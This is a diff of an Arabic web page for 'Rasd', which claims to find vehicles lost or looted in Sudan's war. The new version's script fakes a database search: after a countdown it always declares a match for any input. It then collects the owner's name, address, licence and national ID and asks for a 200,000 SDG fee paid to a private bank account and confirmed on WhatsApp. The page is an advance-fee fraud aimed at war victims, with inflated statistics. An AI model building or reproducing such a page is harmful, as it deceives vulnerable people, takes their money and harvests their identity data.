@@ -3,305 +3,309 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>منصة رصد 2026 - تفعيل البلاغات</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
+    <title>منصة رصد للمركبات المفقودة</title>
+    <link rel="icon" href="logo.png" type="image/png"> 
     <style>
         :root {
-            --primary: #1a237e;
-            --primary-light: #e8eaf6;
-            --secondary: #37474f;
-            --light-bg: #f8fafc;
-            --white: #ffffff;
-            --text-muted: #546e7a;
+            --primary-gold: #e5c47b; 
+            --royal-blue: #1e3a8a; 
+            --bg-deep-black: #050505; 
+            --input-bg: #1c1c1c; 
+            --text-white: #ffffff;
+            --text-gray: #a0a0a0;
+            --whatsapp-green: #25D366;
+            --stat-card-bg: #ffffff;
         }
 
         body {
-            font-family: 'Tajawal', sans-serif;
-            background-color: var(--light-bg);
-            margin: 0; padding: 0;
-            color: var(--secondary);
-            line-height: 1.8;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: var(--bg-deep-black); 
+            color: var(--text-white);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            border: 4px solid var(--primary-gold); 
+            box-sizing: border-box; 
         }
-
-        .hero-header {
-            background: url('logo.png') no-repeat center center;
-            background-size: cover;
-            color: white;
-            padding: 180px 20px 100px; 
-            text-align: center;
-            border-radius: 0 0 45px 45px;
-            position: relative;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.15);
-            image-rendering: -webkit-optimize-contrast;
-        }
-
-        .hero-header::after {
-            content: ''; position: absolute; top: 0; left: 0; right: 0; bottom: 0;
-            background: linear-gradient(to bottom, rgba(0,0,0,0.2) 0%, rgba(0,0,0,0.7) 100%); 
-            border-radius: 0 0 45px 45px; 
-            z-index: 1;
-        }
-
-        .hero-content { position: relative; z-index: 2; }
-        .hero-content h1 { font-size: 2.3rem; text-shadow: 2px 2px 10px rgba(0,0,0,0.8); }
 
         .container {
-            max-width: 600px;
-            margin: -60px auto 50px;
-            padding: 0 15px;
-            position: relative;
-            z-index: 3;
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 2rem; 
         }
 
         .card {
-            background: var(--white);
-            padding: 30px;
-            border-radius: 20px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.05);
-            margin-bottom: 25px;
-            border: 1px solid #e1e8ed;
+            width: 100%;
+            max-width: 500px; 
+            background: transparent; 
+            text-align: center;
         }
 
-        .legal-text { font-size: 14px; border-bottom: 1px solid #eee; padding-bottom: 20px; margin-bottom: 20px; }
-        .legal-section-title { color: var(--primary); font-weight: 700; display: flex; align-items: center; gap: 8px; margin-bottom: 10px; font-size: 16px; }
-        .legal-content { color: var(--text-muted); margin-bottom: 15px; padding-right: 10px; border-right: 2px solid #cfd8dc; }
+        .logo-box { margin-bottom: 2rem; }
+        .main-logo {
+            max-width: 190px; 
+            height: auto;
+            border-radius: 12px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.5);
+        }
 
-        .live-stats { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 25px; }
-        .stat-box { background: var(--white); padding: 15px; border-radius: 12px; text-align: center; border: 1px solid var(--primary-light); }
-        .stat-number { display: block; font-size: 22px; font-weight: 700; color: var(--primary); }
-        .stat-label { font-size: 12px; color: var(--text-muted); }
+        h1 { color: var(--primary-gold); font-size: 1.8rem; margin-bottom: 0.5rem; }
+        h2 { color: var(--primary-gold); font-size: 1.4rem; margin-top: 1.5rem; }
+        
+        .info-text {
+            text-align: justify;
+            font-size: 0.95rem;
+            line-height: 1.7;
+            color: var(--text-white);
+            background: rgba(255,255,255,0.05);
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+        }
 
-        .stats-banner { background: var(--primary-light); color: var(--primary); padding: 15px; border-radius: 12px; font-size: 13px; font-weight: 500; display: flex; align-items: center; gap: 12px; margin-bottom: 20px; }
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+            margin-bottom: 25px;
+        }
 
-        .type-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin: 20px 0; }
-        .type-btn { background: #fdfdfd; padding: 10px; border-radius: 15px; text-align: center; cursor: pointer; border: 2px solid #eee; transition: 0.3s; }
-        .type-btn img { width: 100%; height: 120px; object-fit: cover; border-radius: 10px; margin-bottom: 8px; }
-        .type-btn span { font-weight: 700; font-size: 15px; }
-        .type-btn.active { border-color: var(--primary); background: var(--primary-light); color: var(--primary); }
+        .stat-item {
+            background: var(--stat-card-bg);
+            padding: 20px 10px;
+            border-radius: 15px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.4);
+            transition: transform 0.3s ease;
+        }
 
-        .step-indicator { display: flex; justify-content: space-between; margin-bottom: 30px; position: relative; }
-        .step { width: 32px; height: 32px; background: #eceff1; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; z-index: 2; }
-        .step.active { background: var(--primary); color: white; }
-        .step-indicator::after { content: ''; position: absolute; top: 50%; left: 0; right: 0; height: 2px; background: #eceff1; z-index: 1; transform: translateY(-50%); }
+        .stat-item:hover { transform: translateY(-5px); }
 
-        .form-step { display: none; }
-        .form-step.active { display: block; animation: fadeIn 0.5s ease; }
+        .stat-number {
+            display: block;
+            font-size: 1.8rem;
+            font-weight: bold;
+            color: var(--royal-blue);
+            margin-bottom: 5px;
+        }
 
-        input, select { width: 100%; padding: 14px; margin-bottom: 15px; border: 1px solid #cfd8dc; border-radius: 10px; font-family: inherit; box-sizing: border-box; }
-        input:focus { outline: none; border-color: var(--primary); }
+        .stat-label {
+            display: block;
+            font-size: 0.85rem;
+            color: #555;
+            font-weight: bold;
+        }
 
-        .payment-card { background: #fafafa; border: 2px dashed #b0bec5; padding: 20px; border-radius: 15px; text-align: center; margin-bottom: 20px; }
-        .transaction-input { border: 2px solid var(--primary) !important; background: #f5f5f5; font-weight: bold; text-align: center; }
+        .policy-box {
+            text-align: right;
+            font-size: 0.85rem;
+            color: var(--text-gray);
+            background: #111;
+            padding: 15px;
+            border-radius: 10px;
+            border: 1px solid #222;
+            margin-bottom: 20px;
+            max-height: 200px;
+            overflow-y: auto;
+        }
 
-        .btn { width: 100%; padding: 16px; border-radius: 12px; font-weight: bold; cursor: pointer; border: none; font-size: 16px; transition: 0.3s; }
-        .btn-next { background: var(--primary); color: white; }
-        .btn-prev { background: #cfd8dc; color: #37474f; margin-top: 10px; }
-        .btn-whatsapp { background: #25d366; color: white; text-decoration: none; display: flex; align-items: center; justify-content: center; gap: 10px; margin-top: 15px; }
+        .input-group { margin-bottom: 18px; text-align: right; }
+        label { display: block; margin-bottom: 6px; font-size: 0.9rem; color: var(--primary-gold); font-weight: bold; }
 
-        footer { text-align: center; padding: 20px; color: var(--text-muted); font-size: 12px; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        input, textarea {
+            width: 100%;
+            padding: 12px;
+            border-radius: 8px;
+            border: 1px solid #333;
+            background: var(--input-bg);
+            color: white;
+            box-sizing: border-box;
+        }
+
+        .btn-submit {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, var(--royal-blue), #152c5a);
+            border: 1px solid var(--primary-gold);
+            border-radius: 8px;
+            color: var(--primary-gold);
+            font-weight: bold;
+            font-size: 1.1rem;
+            cursor: pointer;
+            text-transform: uppercase;
+        }
+
+        .btn-whatsapp {
+            background: var(--whatsapp-green);
+            color: white;
+            border: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .payment-box {
+            background: #1a1a1a;
+            padding: 15px;
+            border-radius: 10px;
+            border: 1px dashed var(--primary-gold);
+            margin-bottom: 20px;
+        }
+
+        #intro-section, #form-section, #search-section, #result-section, #owner-section, #payment-section { display: none; }
+        #intro-section { display: block; }
+
+        .loader {
+            border: 4px solid #333; border-top: 4px solid var(--primary-gold);
+            border-radius: 50%; width: 60px; height: 60px;
+            animation: spin 1s linear infinite; margin: 30px auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .timer-display { font-size: 3rem; font-weight: bold; color: var(--primary-gold); }
     </style>
 </head>
 <body>
 
-<div class="hero-header">
-    <div class="hero-content">
-        <h1>منصة رصد 2026</h1>
-        <p style="margin-top:5px; opacity:0.9;">بوابة البحث والتعقب الميداني في الولايات الآمنة</p>
-    </div>
-</div>
-
 <div class="container">
-    
     <div class="card">
-        <div class="legal-text">
-            <div class="legal-section-title"><i class="fas fa-file-contract"></i> سياسة استرداد الأموال</div>
-            <div class="legal-content">تلتزم المنصة برد الرسوم بنسبة 100% في حال عدم تفعيل البلاغ خلال 24 ساعة. في حال استعادة المركبة بمجهود شخصي خلال 12 ساعة من التفعيل، يتم رد 50% من الرسوم.</div>
-            
-            <div class="legal-section-title"><i class="fas fa-broadcast-tower"></i> آلية الرصد والتعميم</div>
-            <div class="legal-content">فور التفعيل، يتم إرسال بيانات المركبة آلياً لشبكة المناديب والارتكازات بجميع الولايات المحددة لضمان أقصى سرعة استجابة.</div>
+        <div class="logo-box"><img src="logo.png" alt="Logo" class="main-logo"></div>
+
+        <div id="intro-section">
+            <h1>منصة رصد للمركبات المفقودة</h1>
+            <div class="info-text">
+                نظام <strong>رصد</strong> هو النظام التقني الأول المتخصص في رصد واستعادة المركبات التي فقدت أو نُهبت خلال <strong>حرب السودان</strong>، بالإضافة إلى تتبع المركبات المسروقة، معتمداً على أكبر قاعدة بيانات ميدانية يتم تحديثها على مدار الساعة.
+                <br><br>
+                نمتلك شبكة واسعة تضم هناقر ومواقع تجميع مخصصة لحفظ المركبات المستعادة، مع تواصل مباشر ولحظي مع كافة بوابات الدخول والخروج في المدن الآمنة (تحت سيطرة القوات المسلحة) <strong>لرصد حركة المركبات التي يشتبه في سرقتها او نهبها او ان سائقها من اصحاب السوابق (الفيش الجنائي )</strong>. كما يتواجد مناديبنا داخل أقسام الشرطة الرئيسية لضمان مطابقة البلاغات واسترداد الحقوق لأصحابها بأعلى دقة.
+            </div>
+
+            <div class="stats-grid">
+                <div class="stat-item">
+                    <span class="stat-number">1,122</span>
+                    <span class="stat-label">مركبة مستلمة</span>
+                </div>
+                <div class="stat-item">
+                    <span class="stat-number">700</span>
+                    <span class="stat-label">موظف بخدمتكم</span>
+                </div>
+                <div class="stat-item">
+                    <span class="stat-number">55,075</span>
+                    <span class="stat-label">مركبة مرصودة</span>
+                </div>
+                <div class="stat-item">
+                    <span class="stat-number">44,896</span>
+                    <span class="stat-label">عملية بحث</span>
+                </div>
+            </div>
+
+            <h2>سياسة الخصوصية واسترداد الأموال</h2>
+            <div class="policy-box">
+                <strong>1. الخصوصية:</strong> نلتزم بحماية بيانات المالك والمركبة ولا يتم مشاركتها إلا مع الجهات الأمنية المختصة لإكمال عملية التسليم.
+                <br><br>
+                <strong>2. الرسوم الإدارية:</strong> الرسوم المدفوعة مخصصة لتغطية تكاليف التشغيل الميداني، رادارات الرصد، ونفقات الفرق العاملة.
+                <br><br>
+                <strong>3. سياسة الاسترداد:</strong> في حال تم دفع الرسوم ولم يتم تحديد الموقع الدقيق للمركبة خلال 72 ساعة من تأكيد البلاغ، يحق للمشترك استرداد 80% من المبلغ المدفوع، مع خصم 20% كرسوم تشغيل إدارية تقنية.
+            </div>
+
+            <button class="btn-submit" onclick="showForm()">ابدأ عملية المطابقة الآن</button>
         </div>
 
-        <div class="live-stats">
-            <div class="stat-box">
-                <span class="stat-number">+450</span>
-                <span class="stat-label">بلاغ مفعل</span>
-            </div>
-            <div class="stat-box">
-                <span class="stat-number">112</span>
-                <span class="stat-label">مركبة مستردة</span>
-            </div>
+        <div id="form-section">
+            <h1>بيانات المركبة</h1>
+            <div class="input-group"><label>نوع المركبة</label><input type="text" id="carName" placeholder="مثال: لاندكروزر 2024"></div>
+            <div class="input-group"><label>رقم اللوحة</label><input type="text" id="plateNumber" placeholder="مثال: خ 6 888"></div>
+            <div class="input-group"><label>رقم الشاسي (الهيكل)</label><input type="text" id="chassis" placeholder="رقم الشاسي"></div>
+            <div class="input-group"><label>لون السيارة</label><input type="text" id="carColor" placeholder="اللون"></div>
+            <div class="input-group"><label>آخر مكان شوهدت فيه</label><input type="text" id="lastSeen" placeholder="المدينة أو الحي"></div>
+            <div class="input-group"><label>العلامات المميزة</label><textarea id="features" rows="2"></textarea></div>
+            <button class="btn-submit" onclick="runSearch()">بدء المطابقة الأمنية</button>
         </div>
 
-        <div class="stats-banner">
-            <i class="fas fa-users-cog"></i>
-            <span>نعمل بقوة تزيد عن 50 مندوباً في البوابات والأقسام لخدمتكم.</span>
+        <div id="search-section">
+            <h2 style="color: var(--primary-gold);">جاري فحص قاعدة البيانات...</h2>
+            <div class="loader"></div>
+            <div class="timer-display" id="countdown">10</div>
+            <p style="font-size: 0.9rem; color: #888;">يتم مطابقة البيانات مع نظام رصد والبوابات الأمنية</p>
+        </div>
+
+        <div id="result-section">
+            <h2 style="color: #4bb543;">✓ تم إيجاد تطابق!</h2>
+            <p id="result-text" style="font-weight: bold; margin-top: 20px;"></p>
+            <button class="btn-submit" onclick="showOwnerForm()">إكمال بيانات المالك</button>
+        </div>
+
+        <div id="owner-section">
+            <h2 style="color: var(--primary-gold);">بيانات مالك المركبة</h2>
+            <div class="input-group"><label>الاسم الكامل</label><input type="text" id="ownerName"></div>
+            <div class="input-group"><label>السكن الحالي</label><input type="text" id="ownerAddress"></div>
+            <div class="input-group"><label>رقم الواتساب</label><input type="text" id="ownerPhone"></div>
+            <div class="input-group"><label>رقم الرخصة</label><input type="text" id="license"></div>
+            <div class="input-group"><label>الرقم الوطني</label><input type="text" id="nationalId"></div>
+            <button class="btn-submit" onclick="showPaymentForm()">متابعة للدفع</button>
+        </div>
+
+        <div id="payment-section">
+            <h2 style="color: var(--primary-gold);">الرسوم الإدارية</h2>
+            <p style="font-size: 0.9rem; line-height: 1.5;">لتحديد موقع وجود المركبة الدقيق، يرجى دفع رسوم إدارية لتغطية نفقات الفريق العامل وإكمال إجراءات التسليم.</p>
+            <div class="payment-box">
+                <p>المبلغ: <strong>200,000 ج.س</strong></p>
+                <p>رقم الحساب: <br><strong style="color: var(--primary-gold);">7867881</strong></p>
+                <p>اسم صاحب الحساب: <br><strong style="color: var(--primary-gold);">حافظ حسن</strong></p>
+            </div>
+            <div class="input-group"><label>رقم العملية</label><input type="text" id="transactionId" placeholder="ادخل رقم العملية هنا بعد نسخه من الاشعار"></div>
+            <button class="btn-submit btn-whatsapp" onclick="sendToWhatsApp()">تأكيد البلاغ عبر الواتساب</button>
         </div>
     </div>
-
-    <div class="card">
-        <div class="step-indicator">
-            <div class="step active" id="s1">1</div>
-            <div class="step" id="s2">2</div>
-            <div class="step" id="s3">3</div>
-        </div>
-
-        <form id="mainForm">
-            <div class="form-step active" id="step1">
-                <label style="font-weight: bold; margin-bottom: 10px; display: block;">نوع المركبة المفقودة:</label>
-                <div class="type-grid">
-                    <div class="type-btn active" onclick="setType('سيارة', this)">
-                        <img src="car.jpg" alt="سيارة" onerror="this.src='https://via.placeholder.com/150?text=Car'">
-                        <span>سيارة</span>
-                    </div>
-                    <div class="type-btn" onclick="setType('ركشة', this)">
-                        <img src="raksha.jpg" alt="ركشة" onerror="this.src='https://via.placeholder.com/150?text=Raksha'">
-                        <span>ركشة</span>
-                    </div>
-                </div>
-                <input type="hidden" name="نوع_المركبة" id="vType" value="سيارة">
-                
-                <input type="text" name="المواصفات" id="vDesc" placeholder="الماركة، الطراز واللون (مثل: كليك أبيض)" required>
-                <input type="text" name="رقم_اللوحة" id="vPlate" placeholder="رقم اللوحة (إن وجد)" required>
-                <input type="text" name="رقم_الشاسي" id="vChassis" placeholder="رقم الشاسي" required>
-                <input type="text" name="رقم_المحرك" id="vEngine" placeholder="رقم المحرك" required>
-                <input type="text" name="علامة_مميزة" id="vFeature" placeholder="علامة مميزة (صدمة، كسر، ملصق...)" required>
-                
-                <button type="button" class="btn btn-next" onclick="nextStep(2)">التالي: الموقع والزمان</button>
-            </div>
-
-            <div class="form-step" id="step2">
-                <label>تاريخ الفقدان (يوم/شهر/سنة):</label>
-                <input type="text" name="تاريخ_الفقدان" id="vDate" placeholder="مثلاً: 25/03/2026" required>
-                <input type="text" name="آخر_موقع" id="vLastLoc" placeholder="آخر مكان شوهدت فيه" required>
-                <select name="ولاية_الرصد" id="vState" required>
-                    <option value="">ولاية الرصد المستهدفة...</option>
-                    <option value="الخرطوم">ولاية الخرطوم</option>
-                    <option value="نهر النيل">ولاية نهر النيل</option>
-                    <option value="الشمالية">الولاية الشمالية</option>
-                    <option value="البحر الأحمر">ولاية البحر الأحمر</option>
-                    <option value="القضارف">ولاية القضارف</option>
-                    <option value="كسلا">ولاية كسلا</option>
-                    <option value="الجزيرة">ولاية الجزيرة</option>
-                    <option value="سنار">ولاية سنار</option>
-                    <option value="النيل الأبيض">ولاية النيل الأبيض</option>
-                    <option value="النيل الأزرق">ولاية النيل الأزرق</option>
-                </select>
-
-                <button type="button" class="btn btn-next" onclick="nextStep(3)">التالي: تفعيل الرصد</button>
-                <button type="button" class="btn btn-prev" onclick="prevStep(1)">رجوع</button>
-            </div>
-
-            <div class="form-step" id="step3">
-                <div class="payment-card">
-                    <h2 style="color:var(--primary); margin:0;">200,000 ج.س</h2>
-                    <p style="font-size: 13px; margin: 10px 0; color:var(--text-muted);">رسوم التشغيل الميداني والتعميم</p>
-                    <div style="background: #fff; padding: 10px; border-radius: 8px; border: 1px solid #ddd; margin-bottom: 15px;">
-                        <p style="margin:0; font-size: 14px;">حساب بنكك: <strong>7867881</strong></p>
-                        <p style="margin:5px 0 0; font-size: 14px;">باسم: <strong>حافظ حسن</strong></p>
-                    </div>
-                    <label style="display:block; margin-bottom: 8px; font-weight: bold;">رقم العملية من تطبيق "بنكك":</label>
-                    <input type="text" name="رقم_العملية" id="vTransID" class="transaction-input" placeholder="أدخل رقم العملية" required>
-                </div>
-                <input type="hidden" name="رقم_البلاغ" id="vOrderIDInput">
-                <input type="tel" name="هاتف_المالك" id="vPhone" placeholder="رقم واتساب المالك للمتابعة" required>
-
-                <button type="submit" id="submitBtn" class="btn btn-next">إرسال وتفعيل البلاغ</button>
-                <button type="button" class="btn btn-prev" onclick="prevStep(2)">رجوع</button>
-            </div>
-        </form>
-
-        <div id="successMessage" style="display:none; text-align:center;">
-            <div style="background: var(--primary-light); width:70px; height:70px; border-radius:50%; display:flex; align-items:center; justify-content:center; margin:0 auto 20px;">
-                <i class="fas fa-check" style="font-size:35px; color:var(--primary);"></i>
-            </div>
-            <h2 style="color:var(--primary);">تم استلام بلاغك بنجاح</h2>
-            <p>رقم البلاغ المرجعي:</p>
-            <div id="displayOrderId" style="font-size:28px; color:var(--primary); font-weight:bold; margin:10px 0;">RSD-XXXX</div>
-            <p style="font-size:13px; color:var(--text-muted); margin-bottom: 20px;">يرجى تأكيد الدفع عبر الواتساب لبدء التعميم الميداني فوراً.</p>
-            <a id="whatsappLink" href="#" target="_blank" class="btn btn-whatsapp">
-                <i class="fab fa-whatsapp"></i> تأكيد رقم العملية عبر الواتساب
-            </a>
-        </div>
-    </div>
-
-    <footer>&copy; 2026 منصة رصد السودان | جميع الحقوق محفوظة</footer>
 </div>
 
 <script>
-    function setType(type, el) {
-        document.getElementById('vType').value = type;
-        document.querySelectorAll('.type-btn').forEach(b => b.classList.remove('active'));
-        el.classList.add('active');
+    function showForm() {
+        document.getElementById('intro-section').style.display = 'none';
+        document.getElementById('form-section').style.display = 'block';
     }
 
-    function nextStep(s) {
-        const currentFields = document.getElementById('step' + (s-1)).querySelectorAll('[required]');
-        let valid = true;
-        currentFields.forEach(f => {
-            if(!f.value) { f.style.borderColor = '#ff5252'; valid = false; }
-            else { f.style.borderColor = '#cfd8dc'; }
-        });
-        if(!valid) return;
-        document.querySelectorAll('.form-step').forEach(step => step.classList.remove('active'));
-        document.getElementById('step' + s).classList.add('active');
-        document.querySelectorAll('.step').forEach((step, i) => {
-            if(i < s) step.classList.add('active'); else step.classList.remove('active');
-        });
-        window.scrollTo({ top: 0, behavior: 'smooth' });
-    }
-
-    function prevStep(s) {
-        document.querySelectorAll('.form-step').forEach(step => step.classList.remove('active'));
-        document.getElementById('step' + s).classList.add('active');
-        document.querySelectorAll('.step').forEach((step, i) => {
-            if(i >= s) step.classList.remove('active');
-        });
-        window.scrollTo({ top: 0, behavior: 'smooth' });
-    }
-
-    const FORMSPREE_ENDPOINT = "https://formspree.io/f/xkopnwzo";
-
-    document.getElementById('mainForm').addEventListener('submit', async function(e) {
-        e.preventDefault();
-        const btn = document.getElementById('submitBtn');
-        const orderId = 'RSD-' + Math.floor(1000 + Math.random() * 9000);
-        document.getElementById('vOrderIDInput').value = orderId;
-
-        btn.disabled = true;
-        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري إرسال البيانات...';
-
-        const formData = new FormData(this);
-
-        try {
-            const response = await fetch(FORMSPREE_ENDPOINT, {
-                method: 'POST',
-                body: formData,
-                headers: { 'Accept': 'application/json' }
-            });
-
-            if (response.ok) {
-                const transID = document.getElementById('vTransID').value;
-                const phone = document.getElementById('vPhone').value;
-                const waMsg = `تأكيد بلاغ رصد\nرقم البلاغ: ${orderId}\nرقم العملية: ${transID}\nالهاتف: ${phone}`;
-                document.getElementById('whatsappLink').href = `https://wa.me/249100850483?text=${encodeURIComponent(waMsg)}`;
-                
-                document.getElementById('mainForm').style.display = 'none';
-                document.querySelector('.step-indicator').style.display = 'none';
-                document.getElementById('displayOrderId').innerText = orderId;
-                document.getElementById('successMessage').style.display = 'block';
-                window.scrollTo({ top: 0, behavior: 'smooth' });
-            } else {
-                alert('حدث خطأ في الإرسال. يرجى مراجعة إعدادات Formspree.');
+    function runSearch() {
+        const carName = document.getElementById('carName').value;
+        const plateNumber = document.getElementById('plateNumber').value;
+        if(!carName || !plateNumber) return alert("يرجى ملء الحقول");
+        
+        document.getElementById('form-section').style.display = 'none';
+        document.getElementById('search-section').style.display = 'block';
+        let s = 10;
+        const timer = setInterval(() => {
+            s--; document.getElementById('countdown').innerText = s;
+            if(s <= 0) {
+                clearInterval(timer);
+                document.getElementById('search-section').style.display = 'none';
+                document.getElementById('result-section').style.display = 'block';
+                document.getElementById('result-text').innerText = `تمت مطابقة اسم المركبة: (${carName}) مع اللوحة: (${plateNumber}) بنجاح في قاعدة بياناتنا.`;
             }
-        } catch (error) {
-            alert('خطأ في الاتصال بالشبكة.');
-        } finally {
-            btn.disabled = false;
-            btn.innerText = 'إرسال وتفعيل البلاغ';
-        }
-    });
+        }, 1000);
+    }
+
+    function showOwnerForm() {
+        document.getElementById('result-section').style.display = 'none';
+        document.getElementById('owner-section').style.display = 'block';
+    }
+
+    function showPaymentForm() {
+        document.getElementById('owner-section').style.display = 'none';
+        document.getElementById('payment-section').style.display = 'block';
+    }
+
+    function sendToWhatsApp() {
+        const transId = document.getElementById('transactionId').value;
+        const phone = "249112508713"; 
+        
+        if(!transId) return alert("أدخل رقم العملية");
+        const msg = `*بلاغ استرداد مركبة - منصة رصد*%0A- النوع: ${document.getElementById('carName').value}%0A- اللوحة: ${document.getElementById('plateNumber').value}%0A- المالك: ${document.getElementById('ownerName').value}%0A- رقم العملية: ${transId}`;
+        window.open(`https://wa.me/${phone}?text=${msg}`, '_blank');
+    }
 </script>
+
 </body>
 </html>
